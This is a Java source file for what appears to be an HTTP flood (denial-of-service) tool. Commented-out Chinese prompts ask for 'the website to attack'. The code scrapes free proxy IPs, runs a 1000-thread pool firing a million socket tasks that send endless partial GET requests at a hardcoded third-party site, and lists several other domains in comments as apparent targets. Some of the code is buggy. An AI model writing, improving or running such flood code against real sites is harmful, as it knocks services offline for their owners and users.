package cchurter;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Main {

    public static String url = "https://www.alanyhq.com";
    public static int i = 0;
    public static int using = 0;
    public static List<String> iplist = new ArrayList<>();

    public static void main(String[] args) {
        /*System.out.println("输入要攻击的网站");
        Scanner s = new Scanner(System.in);
        url = s.next();
        System.out.println("wait..........正在索取代理IP");
        for (int i = 0;i < 10;i++){
            getIpSaveToIPList();
            System.out.println("第" + (i+1) + "次索取");
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ex) {
                Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        System.out.println("wait..........索取完毕，正在准备线程");*/
        ExecutorService es = Executors.newFixedThreadPool(1000);
        HTTPThread2 t = new HTTPThread2();
        for (int j = 0; j < 1000000; j++) {
            es.execute(t);
        }
    }

    public static void getIpSaveToIPList() {
        try {
            URL url = new URL("https://www.kuaidaili.com/free");
            URLConnection uc = url.openConnection();
            uc.setDoInput(true);
            InputStream is = uc.getInputStream();
            Pattern ipPtn = Pattern.compile("[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}");
            byte[] data = new byte[1024];
            while (is.read(data) != -1) {
                String s = new String(data);
                Matcher m = ipPtn.matcher(s);
                while (m.find()) {
                    String[] strs = m.group().split(" ");
                    iplist.add(strs[0]);
                }
            }
        } catch (MalformedURLException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}

class HTTPThread extends Thread {

    @Override
    public void run() {
        try {
            URL url = new URL(Main.url);
            URLConnection c = url.openConnection();
            while (true) {
                while (true) {
                    if (Main.using >= Main.iplist.size()) {
                        Main.using = 0;
                    }
                    System.getProperties().setProperty("http.proxyHost", Main.iplist.get(Main.using));
                    Main.using++;
                    c.connect();
                    c.setConnectTimeout(1000);
                    Main.i++;
                    System.out.println("TYPE:" + ((HttpURLConnection) c).getResponseCode());
                }
            }
        } catch (IOException ex) {
        }
    }
}
//http://www.docin.com
//https://www.alanyhq.com
//https://www.fpqxhb.com
//http://www.fwgqz.com
 
class HTTPThread2 extends Thread{
    @Override
    public void run() {
        try {
            String path = "/";
            String host = Main.url;
            int port = 8080;
            while (true){
            Socket socket = new Socket();
            socket.setSoTimeout(100000);
            InetSocketAddress address = new InetSocketAddress(host, port);         
                socket.connect(address,3000);
                OutputStreamWriter osw = new OutputStreamWriter(socket.getOutputStream(),"utf-8");
                osw.write("GET " + path + " HTTP/1.1\r\n");
                osw.write("Host: " + host + " \r\n");
                //osw.write("\r\n");
                osw.flush();
                socket.shutdownOutput();    
            }          
        }catch (ConnectException e) {
            System.out.println("连接失败");
        }catch (SocketTimeoutException e) {
            System.out.println("连接超时");
        } catch (IOException ex) {
            Logger.getLogger(HTTPThread2.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}